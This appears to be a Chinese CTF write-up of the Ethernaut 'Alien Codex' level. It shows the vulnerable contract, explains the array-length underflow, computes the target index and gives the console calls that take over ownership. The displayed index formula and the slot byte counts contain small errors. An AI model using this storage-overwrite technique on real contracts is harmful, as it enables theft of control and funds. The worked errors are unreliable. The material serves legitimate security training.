# Alien Codex

> 你打开了一个 Alien 合约. 申明所有权来完成这一关.

## 源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () internal {
        _owner = msg.sender;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(isOwner(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Returns true if the caller is the current owner.
     */
    function isOwner() public view returns (bool) {
        return msg.sender == _owner;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * > Note: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     */
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
  	codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```

## 攻击思路

solidity在v0.6.0+commit.26b70077版本前，允许变长数组的长度属性被程序员修改。

所以如果我们将一个长度为0的变成数组的长度减一，就会触发内存溢出，将长度从零变为115792089237316195423570985008687907853269984665640564039457584007913129639935（256位全是1）。

而solidty的内存插槽一共有 2^256 个（每个插槽有256bits = 32bytes）,这样如果这个数组的类型为bytes32类型，那么就意味着，该变长数组可以访问和修改所有数据。

只要我们知道了特定变量的数据所在插槽，就可以修改该变量，比如将owner修改。

**不过在v0.6.0+commit.26b70077版本开始，变长数组的长度属性已经变为只读变量。不能修改了。**如果尝试修改就会出现如下错误：

```
TypeError: Member "length" is read-only and cannot be used to resize arrays.
```

## 攻击流程

### 前摇

首先，查看合约中owner变量存储在哪个插槽，合约一共有3个变量。

```solidity
address private _owner;// address 占20字节，在插槽slot0中，此时插槽slot0还剩10字节
bool public contact;// bool 占1个字节，在插槽slot0中，此时插槽slot0还剩9字节
bytes32[] public codex;// bytes32 占32字节，插槽slot0中不够存储，所以codex变量存储在插槽slot1中。
```

不过插槽slot1中存储的是，变长数组codex的长度属性，即codex.length。codex的第一个数据（codex[0]）存储在插槽下标为sha3(byte32(1)) = 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6（此时应该把这个看作数字而不是字符串）的插槽中。所以我们只需找到插槽slot0属于变长数组的第几个元素（即找到slot0在数组codex的下标是多少）。

一共2^256个插槽，插槽下标从0开始。插槽编号 [0 ~ 2^256) 半闭半开。所以slot0在codex的下标为 
$$
\mathop{{2}}\nolimits^{{256}} - 1 + 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 +1
$$

$$
= 35707666377435648211887908874984608119992236509074197713628505308453184860938
$$

计算合约

```solidity
function cala() public pure returns (uint256){
    bytes32 index = keccak256(abi.encode(1));
    uint L = 0;
    return (L - 1) - uint256(index) + 1;
  }
```

**另外，在v0.8.0+commit.c7dfd78e版本开始，solidity内置里safeMath，在代码执行时（编译阶段不会判断）会对溢出做判断（VM error: revert）。已经不会出现 0 - 1 = 2^256 的问题了。**

### 正片

调用合约的make_contact函数开启合约

```js
await contract.make_contact()
```

使变长数组的长度下溢出

```js
await contract.retract()
```

覆盖slot0中内容,将owner变成自己的账号

```js
await contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938','0x00000000000000000000000033AC5f3A75BE5F8720650bD2821118689FeF85d1')
```

提交实例，攻击成功，收。